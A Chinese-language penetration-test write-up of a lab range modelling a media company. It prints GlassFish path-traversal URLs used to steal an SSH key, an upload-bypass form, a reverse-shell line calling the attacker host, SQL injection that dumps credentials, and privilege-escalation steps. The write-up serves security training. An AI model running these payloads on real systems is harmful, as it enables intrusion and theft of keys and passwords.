## 摘要

靶场模拟一家规模在一百人左右的数字传媒公司，公司总部在重庆，在成都设立一办事处。公司共计以下五个部门。在评估期间，在xhlab.com的网络上发现了几个令人担忧的漏洞。在执行攻击时，作者能够访问多台机器，这主要是由于过时的补丁和糟糕的安全配置。在测试期间，部分系统成功入侵，从而控制了网络中的部分系统。这些系统以及有关如何获得访问权限的简要说明在以下部分中列出。

受损机器概述如下

主机名

|

对应公网IP

|

对应内网IP  
  
---|---|---  
  
WEB01

|

10.10.80.2

|

10.50.10.8  
  
蜜罐1

|

无

|

10.50.10.10  
  
WEB02

|

10.10.80.3

|

10.50.10.5  
  
WEB03

|

10.10.80.4

|

10.50.10.6  
  
localhost.localdomain

|

10.10.80.9

|

192.168.254.2  
  
MSSQL

|

无

|

192.168.200.20  
  
DCXH

|

无

|

192.168.100.200  
  
MAIL_USER

|

10.10.80.160

|

192.168.100.10  
  
ITdevPC

|

无

|

192.168.100.11  
  
由公示信息可得知公司共计五个部门：

1、传媒与设计部（MD dep）

2、行政部门（Admin dep）

3、销售部门（Sales dep）

4、财务部门（Finance dep）

5、信息技术服务部门（IT dep）

攻击的范围：

10.50.10.1-10,更多信息需要去靶场获取

本次攻击的团队服务器为10.10.80.155

本机的攻击地址：

![](https://image.3001.net/images/20220918/1663436144_6326057018e06ae64a27d.png!small)

在对于靶场进行内部渗透测试时，我将通过各种工具对目标进行信息收集并且扫描多台机器并尝试找到最容易实现的目标，获取其最高权限system/root。

代理开启情况统计：

协议

|

地址

|

端口  
  
---|---|---  
  
socks4a

|

10.10.80.2

|

8081  
  
socks4a

|

192.168.200.20

|

56787  
  
## 信息收集

### 1.Fscan进行c段端口扫描：

由于获取到的攻击外网范围是在10.10.80.1-10，所以并不明确详细的攻击范围，所以用fscan进行端口存活扫描所以通过nmap跟fscan扫描主机以及主机开启端口情况

![](https://image.3001.net/images/20220918/1663503418_63270c3acae9ab421e66a.png!small)

![](https://image.3001.net/images/20220918/1663503449_63270c59e55338412e934.png!small)![](https://image.3001.net/images/20220918/1663503476_63270c74abac984444ea5.png!small)

使用fscan扫描c段后，发现可以对10.10.80.1-10的端口以及服务进一步扫描

### 2.NAMP扫描端口以及端口服务：

![](https://image.3001.net/images/20220918/1663503550_63270cbe38f5a2ce2ba22.png!small)

对于开启22端口的IP地址通过NMAP扫描出开启了OPENSSH服务，那么可能对应的主机可能会出现私钥泄露，弱口令，但是由于22是暴露于公网，所以存在弱口令的可能性不大，所以决定先从web入手

APACHE IIS
NGINX等服务对应的主机如果没有打补丁可以根据APACHE,IIS,NAINX中间件服务的版本去找一些漏洞，具体需要与主机信息进行结合

### 3.端口和应用整理：

从中我对于开放80,8080,443,8181，4848端口的IP地址进行访问，并对其进行了整理

![](https://image.3001.net/images/20220918/1663503694_63270d4e068acf38d9248.png!small)

其中，发现了以下几个认为可以入手的点，并将对其进行攻击

![](https://image.3001.net/images/20220918/1663503775_63270d9f550162c12b3bb.png!small)![](https://image.3001.net/images/20220918/1663503796_63270db43e16728dfd926.png!small)

###
![](https://image.3001.net/images/20220918/1663503831_63270dd729c954505dcc4.png!small)![](https://image.3001.net/images/20220918/1663503859_63270df370a2370ae35b2.png!small)![](https://image.3001.net/images/20220918/1663504029_63270e9d97b87bdd92338.png!small)  
4.整体分析

a、对于10.10.80.2与10.10.80.9首先想到可能会出现注入，弱口令登陆等漏洞登陆的后台可能是利用CMS搭建，可以进一步的去探寻.

b、10.10.80.3是一个纯静态的页面，前端无法找到与后端交互，但是开启了SSH服务，可能需要扫描一下

c、10.10.80.4通过端口扫描发现了GLASSFISH服务，可以根据其版本去寻找可以利用的漏洞

d、10.10.80.8发现了一个OUTLOOK邮箱登陆的web页面，那么在靶场内可能会存在一些泄露的邮箱，可以根据泄露的邮箱账号密码进行钓鱼等攻击。

## 渗透测试

### 一、外部区域

### 1、10.10.80.4

根据上述的信息收集，我首先将开启GLASSFISH的主机作为首要目标，因为已获取到其版本信息，通过版本信息我找到了该版本的漏洞

glassfish4.1.2漏洞 任意文件读取（CVE-2017-1000028）

那么接下来就是根据漏洞指纹验证漏洞是否存在，如果存在就使用POC进行攻击

### A、立足点

![](https://image.3001.net/images/20220918/1663504310_63270fb681d39e98aff93.png!small)

监听端口界面

![](https://image.3001.net/images/20220918/1663504359_63270fe78ef47280f3fe0.png!small)

证明漏洞存在，使用该漏洞的poc进行攻击

> payload为
>
> https://10.10.80.4:4848/theme/META-> INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/

![](https://image.3001.net/images/20220918/1663504776_632711889a18ecffb6eda.png!small)

成功读取到etc目录，之前信息收集的时候发现开启了SSH服务并且是一台Linux主机，于是想了以下私钥泄露，在Linux主机下面默认密钥存储位置是在用户的.ssh文件下面，用户是在Home目录下面

    
    
    Payload为：
    ‘https://10.10.80.4:4848/theme/METAINF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/’
    

目录下面发现web03用户

![](https://image.3001.net/images/20220918/1663504861_632711dde07dbdebaae70.png!small)

所以继续翻找

Playlaod为‘https://10.10.80.4:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/web03’

web03目录下面发现了.ssh目录，继续翻找

![](https://image.3001.net/images/20220918/1663505108_632712d41dff7ff45333d.png!small)

    
    
    Payload为‘https://10.10.80.4:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/web03/.ssh/id_rsa’

![](https://image.3001.net/images/20220918/1663505161_63271309e7fd1dcfe3a7f.png!small)

成功发现私钥，将私钥复制后，使用John进行密码爆破

先查找john位置:locate ssh2john

使用ssh2john.py将之前复制保存的私钥转换成john能够爆破识别的文件

/usr/share/john/ssh2john.py id_rsa >sshbao

![](https://image.3001.net/images/20220918/1663505206_63271336e0f8642ea0f21.png!small)

爆破结果密码为199801

之后通过远程管理工具Finalshell用密钥连接的方式进行连接，成功进入主机

![](https://image.3001.net/images/20220918/1663505248_63271360cf1d0745e4e87.png!small)

该漏洞修复方法：升级版本

连上之后whoami查询到的用户为web03，所以下一步就是提权

### B、主机信息收集：

主机操作系统版本

![1663505425_632714110f02bf54d4c35.png!small?1663505424694](https://image.3001.net/images/20220918/1663505425_632714110f02bf54d4c35.png!small?1663505424694)

![1663505643_632714eb9c39cc12704a2.png!small?1663505643464](https://image.3001.net/images/20220918/1663505643_632714eb9c39cc12704a2.png!small?1663505643464)

主机内核，系统信息

![1663505707_6327152bca7ecb8b298f8.png!small?1663505707584](https://image.3001.net/images/20220918/1663505707_6327152bca7ecb8b298f8.png!small?1663505707584)

![1663505725_6327153d4c7a40794f402.png!small?1663505725246](https://image.3001.net/images/20220918/1663505725_6327153d4c7a40794f402.png!small?1663505725246)

主机安装的程序有哪些

![](https://image.3001.net/images/20220918/1663505752_63271558e579ebd9c8e90.png!small)

### C、权限提升

在这之后使用提权辅助脚本工具（linux-exploit-suggester）进行漏洞查找,将工具通过Finalshell(远程管理工具)传入主机内，传入的路径为/home/web03/linux-exploit-suggester。

![](https://image.3001.net/images/20220918/1663505801_63271589494628121b6eb.png!small)![](https://image.3001.net/images/20220918/1663505820_6327159cad73b326ca556.png!small)

那么选择从年份最近的cve开始攻击，首先使用的是cve-2021-4034

    
    
    Poc  url: ‘https://github.com/arthepsy/CVE-2021-4034’

尝试后无果

接下来采用cve-2021-3156

POC文件url:

    
    
    ‘https://github.com/worawit/CVE-2021-3156/blob/main/exploit_userspec.py’

将文件复制下来之后，运行

![](https://image.3001.net/images/20220918/1663505914_632715fa0cb490e9a2300.png!small)

![](https://image.3001.net/images/20220918/1663505929_632716095e67f24494c26.png!small)

查看ctc/passwd 发现已经对/etc/passwd文件进行了修改

![](https://image.3001.net/images/20220918/1663505963_6327162bd6c0a6f831e6b.png!small)

切换到su账户，查看权限，获取root最高权限

![](https://image.3001.net/images/20220918/1663505996_6327164c37341bb1035d7.png!small)

该漏洞修复方法如下：对于自动分配的普通用户进行限制，包括网站使用的账户也要进行限制，SSH登陆做IP白名单限制，SUDU命令升级到最新版本。

### D、进一步利用思考

获取权限后，发现10.50段，发现主机ping不通网关，也不能出网，接着翻找了主机内的文件，并没有发现什么有用的信息，所以放弃深入

![](https://image.3001.net/images/20220918/1663506025_6327166930f78ff0fcb70.png!small)

  

## 主机二、10.10.80.9

### A、立足点

web访问端口80页面后，首先想到注入，但是看到验证码就没有先去实际操作，利用dirsearch扫描一下网站目录，说不定会有一些目录有着重要的信息

![1663506059_6327168b1f1e63d863ef0.png!small?1663506058915](https://image.3001.net/images/20220918/1663506059_6327168b1f1e63d863ef0.png!small?1663506058915)

![1663506074_6327169a82ceb3246a6a5.png!small?1663506074518](https://image.3001.net/images/20220918/1663506074_6327169a82ceb3246a6a5.png!small?1663506074518)

用dirsearch扫描一下网站目录，说不定会有一些目录有着重要的信息，发现有一个install.php，直接访问

![1663506093_632716add2f709c170b79.png!small?1663506093701](https://image.3001.net/images/20220918/1663506093_632716add2f709c170b79.png!small?1663506093701)

![1663506114_632716c2590672cd6e4a2.png!small?1663506114113](https://image.3001.net/images/20220918/1663506114_632716c2590672cd6e4a2.png!small?1663506114113)

发现辰光客服系统，百度搜索了一下辰光CMS的漏洞,发现了一篇文章’<https://www.bilibili.com/read/cv8198447/>’

可以在本地写一个上传点，通过action参数去指定上传ip跟路径 去替换掉主机上面的，然后进行进行上传

代码如下

    
    
    <from action="http://10.10.80.9/admin/event/uploadimg" method="post" enctype="multipart/from-data">
        <label for="file">Filename:</label>
        <input type="file" name="editormd-imag-file" id="editormd-image-file"/>
        <br/>
        <input type="submit" name="submit" value="Submit">
    </from>

![1663506190_6327170e6ccff639a664e.png!small?1663506190084](https://image.3001.net/images/20220918/1663506190_6327170e6ccff639a664e.png!small?1663506190084)

![1663506206_6327171ee78e487f71295.png!small?1663506206580](https://image.3001.net/images/20220918/1663506206_6327171ee78e487f71295.png!small?1663506206580)

利用burp进行抓包之后修改后缀并传aspx木马

![1663506223_6327172fc251a2cfb14a1.png!small?1663506223565](https://image.3001.net/images/20220918/1663506223_6327172fc251a2cfb14a1.png!small?1663506223565)

首次传马时右边并没有返回路径，那么可能是对上传的文件做了限制，接下来尝试绕过，

![1663506243_632717431aa6ec0c185ba.png!small?1663506242914](https://image.3001.net/images/20220918/1663506243_632717431aa6ec0c185ba.png!small?1663506242914)

![1663506259_632717531ef880f88ea51.png!small?1663506258919](https://image.3001.net/images/20220918/1663506259_632717531ef880f88ea51.png!small?1663506258919)

蚁剑连接成功

![1663506277_63271765351cb1579685c.png!small?1663506276907](https://image.3001.net/images/20220918/1663506277_63271765351cb1579685c.png!small?1663506276907)

![1663506309_632717855f93428ec2e30.png!small?1663506309174](https://image.3001.net/images/20220918/1663506309_632717855f93428ec2e30.png!small?1663506309174)

传入的路径：10.10.80.9/public/upload/files/1661965320.php

进入后，使用蚁剑插件查看基本信息，发现PHP版本为7.1.5

![1663506342_632717a65ba31b5facff8.png!small?1663506342334](https://image.3001.net/images/20220918/1663506342_632717a65ba31b5facff8.png!small?1663506342334)

发现不能执行命令，因为是PHP，可能是由于disable_functions，禁用了，查看一下phpinfo

![1663506376_632717c802375d6ac53e9.png!small?1663506375782](https://image.3001.net/images/20220918/1663506376_632717c802375d6ac53e9.png!small?1663506375782)

![1663506398_632717de506ca93f2b3b4.png!small?1663506398076](https://image.3001.net/images/20220918/1663506398_632717de506ca93f2b3b4.png!small?1663506398076)

disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行

绕过，那么怎么去绕过disable_functions呢，蚁剑有一个插件：绕过disable_functios

![1663506421_632717f50348000191de8.png!small?1663506420752](https://image.3001.net/images/20220918/1663506421_632717f50348000191de8.png!small?1663506420752)

执行命令成功:

![1663506450_632718125afba2b8ce0ed.png!small?1663506450165](https://image.3001.net/images/20220918/1663506450_632718125afba2b8ce0ed.png!small?1663506450165)

为了进行下一步的提权，我们将在攻击机kali和webshell上分别执行如下

在webshell上执行

    
    
    bash -i >& /dev/tcp/10.10.80.153/2555 0>&1

在攻击机kali上执行

    
    
    nc -lvvp 2555
    

####
![1663506538_6327186a0a5a19f6b0bbd.png!small?1663506538054](https://image.3001.net/images/20220918/1663506538_6327186a0a5a19f6b0bbd.png!small?1663506538054)

### B、主机信息收集

查看主机操作系统版本:

![1663506552_63271878ac91f2440edfc.png!small?1663506552445](https://image.3001.net/images/20220918/1663506552_63271878ac91f2440edfc.png!small?1663506552445)

![1663506568_632718887537212ef3188.png!small?1663506568194](https://image.3001.net/images/20220918/1663506568_632718887537212ef3188.png!small?1663506568194)

查看主机内核、系统信息

![1663506581_63271895d10ff72c81a87.png!small?1663506581595](https://image.3001.net/images/20220918/1663506581_63271895d10ff72c81a87.png!small?1663506581595)

查看主机安装的程序

![1663506595_632718a3e009ae0d1ae2b.png!small?1663506595740](https://image.3001.net/images/20220918/1663506595_632718a3e009ae0d1ae2b.png!small?1663506595740)

### C、权限提升

将工具通过蚁剑传入主机内，传入的路径为/www/wwwroot/10.10.80.9/public/upload/files/linux-exploit-suggester.sh

![1663506616_632718b8d00d55b24205e.png!small?1663506616726](https://image.3001.net/images/20220918/1663506616_632718b8d00d55b24205e.png!small?1663506616726)

![1663506640_632718d0d79ee500056aa.png!small?1663506640825](https://image.3001.net/images/20220918/1663506640_632718d0d79ee500056aa.png!small?1663506640825)

通过辅助提权工具跑出来的结果，选择了cve-2016-5195(脏牛提权)，在本地下载exp，gcc编译之后，通过蚁剑将文件上传上去,上传路径为:/www/wwwroot/10.10.80.9/public/upload/files/dirty/

![1663506660_632718e46d75a00dc7a1f.png!small?1663506660671](https://image.3001.net/images/20220918/1663506660_632718e46d75a00dc7a1f.png!small?1663506660671)

![1663506673_632718f1722b912db2c77.png!small?1663506673379](https://image.3001.net/images/20220918/1663506673_632718f1722b912db2c77.png!small?1663506673379)

成功，尝试使用ssh登录，获取主机root权限

### D、进一步利用思考

![1663506694_632719065418cbbc3877e.png!small?1663506694267](https://image.3001.net/images/20220918/1663506694_632719065418cbbc3877e.png!small?1663506694267)

成功获取root最高权限，获取权限后在webshell上面翻找到database.php文件，里面记录了数据库的用户名跟密码，尝试连接

![1663506725_6327192533e47edd37c9f.png!small?1663506725027](https://image.3001.net/images/20220918/1663506725_6327192533e47edd37c9f.png!small?1663506725027)

连接成功

![1663506739_6327193326981e6d810f4.png!small?1663506739326](https://image.3001.net/images/20220918/1663506739_6327193326981e6d810f4.png!small?1663506739326)

通过查找后，没有发现有用的信息

![1663506761_6327194953ea943e755a1.png!small](https://image.3001.net/images/20220918/1663506761_6327194953ea943e755a1.png!small)

通过fscan扫描之后，虽然能出网，但无其他信息，无法深入

![1663506777_632719595c38e8cc82f06.png!small?1663506777475](https://image.3001.net/images/20220918/1663506777_632719595c38e8cc82f06.png!small?1663506777475)

### 主机三、10.10.80.2

#### A、立足点

首先查看web页面，首先想到注入

![1663506799_6327196f76321e48acdd6.png!small?1663506799181](https://image.3001.net/images/20220918/1663506799_6327196f76321e48acdd6.png!small?1663506799181)

‘union select user()发现存在注入

![1663506815_6327197f21222e0c1c496.png!small?1663506814910](https://image.3001.net/images/20220918/1663506815_6327197f21222e0c1c496.png!small?1663506814910)

抓包，将抓到的内容,用Sqlmap跑一下

![1663506841_632719990a327c5b7b4d3.png!small?1663506840810](https://image.3001.net/images/20220918/1663506841_632719990a327c5b7b4d3.png!small?1663506840810)

![1663506861_632719ad23259b7487943.png!small?1663506860886](https://image.3001.net/images/20220918/1663506861_632719ad23259b7487943.png!small?1663506860886)

成功发现存在的5个数据库,并且发现数据库为mssql

![1663506876_632719bc94e10984cb8f0.png!small?1663506876575](https://image.3001.net/images/20220918/1663506876_632719bc94e10984cb8f0.png!small?1663506876575)

在mssql中master,model,msdb,tempdb都是mssql自带的数据库,所以我们接着查db_data下面的表

![1663506917_632719e5865da0601a1cc.png!small?1663506917249](https://image.3001.net/images/20220918/1663506917_632719e5865da0601a1cc.png!small?1663506917249)

![1663506937_632719f98f68abfab1784.png!small?1663506937556](https://image.3001.net/images/20220918/1663506937_632719f98f68abfab1784.png!small?1663506937556)

发现下面有两个表，有个名字叫做logindb，说不定表里面有一些可以用来登陆的账户信息，继续查找表中的列

![1663506956_63271a0c631c8443046f7.png!small?1663506956124](https://image.3001.net/images/20220918/1663506956_63271a0c631c8443046f7.png!small?1663506956124)

![1663506973_63271a1dae1884af97473.png!small?1663506973563](https://image.3001.net/images/20220918/1663506973_63271a1dae1884af97473.png!small?1663506973563)

发现了email id userid userpwd4个列，那么接下来就是一个一个查找下面的数据了

![](https://image.3001.net/images/20220918/1663507009_63271a41a630c1e32c801.png!small)![1663507033_63271a59c618b6f676e44.png!small?1663507034330](https://image.3001.net/images/20220918/1663507033_63271a59c618b6f676e44.png!small?1663507034330)

查询完后，进行了整理

![1663507067_63271a7bf376d7047f193.png!small?1663507067885](https://image.3001.net/images/20220918/1663507067_63271a7bf376d7047f193.png!small?1663507067885)

获取了到了邮箱密码后，突然想到之前发现的outlook登陆地址，于是联想到这些邮箱密码可以拿去钓鱼，或者使用xp_cmdshell进行getshell，尝试了很久的xp_cmdshell
无果，接着尝试使用dirsearch扫描了一下网站目录

![1663507088_63271a9062b33008be4c7.png!small?1663507088282](https://image.3001.net/images/20220918/1663507088_63271a9062b33008be4c7.png!small?1663507088282)

发现有一个/upload文件，接着web去访问，但是需要401先验证，突然想到了刚刚注入得到的账户密码中有一个叫做upload，接着去使用upload尝试了一下

![1663507103_63271a9f0aa5ab95684e8.png!small?1663507102703](https://image.3001.net/images/20220918/1663507103_63271a9f0aa5ab95684e8.png!small?1663507102703)

成功登陆后发现显示的是403,想了一下刚才的登陆，账户密码正确，如果不正确会提示继续输入，所以就算是403那么也能代表已经通过了验证，那么看看可能upload可能只是一个目录，他没有跳转的功能或许这个目录下面还有东西，接着使用dirsearch继续扫无任何输出，(在开发环境中，如果开发人员对开发目录具有一定规则，那么upload目录后面一般跟着upload.xxx；例如：upload.asp、upload.aspx等,于是访问upload/upload.aspx。

![1663507118_63271aae0b4313791e2cd.png!small?1663507117707](https://image.3001.net/images/20220918/1663507118_63271aae0b4313791e2cd.png!small?1663507117707)

![1663507133_63271abd098c6a2efd197.png!small?1663507132665](https://image.3001.net/images/20220918/1663507133_63271abd098c6a2efd197.png!small?1663507132665)

![1663507149_63271acd5447d8ec1c63a.png!small?1663507149090](https://image.3001.net/images/20220918/1663507149_63271acd5447d8ec1c63a.png!small?1663507149090)

上传成功，直接连接目录下面的文件/upload/ma.aspx，由于是认证所以需要连接过程中需要添加header、Authorization才能正常连上webshell

![1663507164_63271adc9502f2e9f02b6.png!small?1663507164369](https://image.3001.net/images/20220918/1663507164_63271adc9502f2e9f02b6.png!small?1663507164369)

![1663507195_63271afbe6aa4e77a89c0.png!small?1663507195713](https://image.3001.net/images/20220918/1663507195_63271afbe6aa4e77a89c0.png!small?1663507195713)

蚁剑连接成功

![1663507300_63271b6435f070415122d.png!small?1663507299993](https://image.3001.net/images/20220918/1663507300_63271b6435f070415122d.png!small?1663507299993)

### B、主机信息收集

![1663507310_63271b6eecaa537b8af9c.png!small?1663507310757](https://image.3001.net/images/20220918/1663507310_63271b6eecaa537b8af9c.png!small?1663507310757)

查看主机用户列表

![1663507349_63271b95199ea5fed2987.png!small?1663507348720](https://image.3001.net/images/20220918/1663507349_63271b95199ea5fed2987.png!small?1663507348720)

查看主机管理员

![1663507381_63271bb5d6b623649f0a7.png!small?1663507381528](https://image.3001.net/images/20220918/1663507381_63271bb5d6b623649f0a7.png!small?1663507381528)

查看进程列表，未发现杀毒程序。

![1663507392_63271bc058fdb3d7ea186.png!small?1663507392338](https://image.3001.net/images/20220918/1663507392_63271bc058fdb3d7ea186.png!small?1663507392338)

查看操作系统版本信息

![1663507403_63271bcb47c0624f2f858.png!small?1663507402917](https://image.3001.net/images/20220918/1663507403_63271bcb47c0624f2f858.png!small?1663507402917)

查看补丁列表

![](https://image.3001.net/images/20220918/1663507424_63271be0d6eb146385fef.png!small)

将systeminfo信息放在windows提权辅助网站(‘http://bugs.hacking8.com/tiquan/’)上，查

找漏洞

![1663507454_63271bfe4784c640333d3.png!small?1663507454034](https://image.3001.net/images/20220918/1663507454_63271bfe4784c640333d3.png!small?1663507454034)

### C、权限提升

首先由于系统是winserver2012 r2
再加上前面信息收集时发现的开启了IIS服务，首先想到了土豆系统的漏洞去进行提权，那么想到一个集成的工具LADON运用ladon下的potato模块去进行提权。

前往github“https://github.com/k8gege/Ladon”直接下载exe文件。

上传至C:\inetpub\wwwroot\upload文件夹中，直接运行ladon.exe sweetpotato 命令，提权成功。  
![1663507488_63271c20d796fa9cb5342.png!small?1663507488660](https://image.3001.net/images/20220918/1663507488_63271c20d796fa9cb5342.png!small?1663507488660)

提权成功之后将该主机上线到团队服务器cobalt strike简称cs

cs是一款GUI框架式的渗透测试工具，集成了很多功能最大的特点是可以团战，有一个服务器，多个客户端，每个客户端就是一个攻击者，攻击者通过连接到服务端来共享攻击资源和目标信息

![1663507805_63271d5d33aec5301ce50.png!small?1663507804832](https://image.3001.net/images/20220918/1663507805_63271d5d33aec5301ce50.png!small?1663507804832)

上线成功

![1663507820_63271d6cb023f61562e90.png!small?1663507820401](https://image.3001.net/images/20220918/1663507820_63271d6cb023f61562e90.png!small?1663507820401)

  

### D、进一步利用思考

在C:/inetpub/wwwroot目录下面发现web.config.bak文件，打开之后发现应该是数据库的连接账户密码以及ip地址，根据配置文件描述使用的域用户dbadmin，于是在蚁剑内运行此账户密码进行连接数据库

![1663507841_63271d81b54f1b54e2db7.png!small?1663507841494](https://image.3001.net/images/20220918/1663507841_63271d81b54f1b54e2db7.png!small?1663507841494)

![1663507856_63271d90f2cb8c33da303.png!small?1663507856848](https://image.3001.net/images/20220918/1663507856_63271d90f2cb8c33da303.png!small?1663507856848)

连接成功后，发现里面的数据跟之前注入时一致

![1663507875_63271da3e2d5c227c9ab3.png!small?1663507875817](https://image.3001.net/images/20220918/1663507875_63271da3e2d5c227c9ab3.png!small?1663507875817)

根据数据库的ip与拿到webshell的主机不同，通过数据库查询语句判断是否为站库分离

查看数据库主机名

![1663507895_63271db7557b494655c30.png!small?1663507895213](https://image.3001.net/images/20220918/1663507895_63271db7557b494655c30.png!small?1663507895213)

查看web端主机名

![1663507912_63271dc8bc13ed9d366ba.png!small?1663507912545](https://image.3001.net/images/20220918/1663507912_63271dc8bc13ed9d366ba.png!small?1663507912545)

  

通过exec xp_cmdshell "whoami"查询当前权限

![1663507928_63271dd881f475a827e04.png!small?1663507928375](https://image.3001.net/images/20220918/1663507928_63271dd881f475a827e04.png!small?1663507928375)

查看一下MSSQL主机systeminfo信息

![1663507947_63271deba106a95ee8a85.png!small?1663507947448](https://image.3001.net/images/20220918/1663507947_63271deba106a95ee8a85.png!small?1663507947448)

![1663507959_63271df734b2878f84d11.png!small?1663507958860](https://image.3001.net/images/20220918/1663507959_63271df734b2878f84d11.png!small?1663507958860)

发现该主机处于域内，这里应该是突破到另一个区域关键点。

  

![1663507976_63271e08317cc7ed437d7.png!small?1663507976679](https://image.3001.net/images/20220918/1663507976_63271e08317cc7ed437d7.png!small?1663507976679)

此主机开启了3389端口。

